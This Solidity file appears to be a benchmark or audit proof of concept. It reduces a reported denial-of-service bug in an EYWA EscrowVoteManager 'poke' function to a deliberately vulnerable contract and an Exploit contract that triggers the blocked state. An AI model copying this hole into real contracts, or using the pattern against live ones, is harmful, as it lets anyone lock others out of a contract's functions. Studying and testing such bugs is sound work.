// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// AuditVault 44337: EYWA EscrowVoteManager poke DoS. Reduced local model preserves the reported state transition.

contract Vulnerable {
    mapping(uint256 => address) public owner; bool public blocked; constructor() { owner[1] = address(1); } function poke(uint256 id) external { if (owner[id] != msg.sender) blocked = true; }
}

contract Exploit {
    Vulnerable public bug;
    bool public success;

    constructor() {
        bug = new Vulnerable();
    }

    function attack() external {
        bug.poke(1); success = bug.blocked();
    }
}


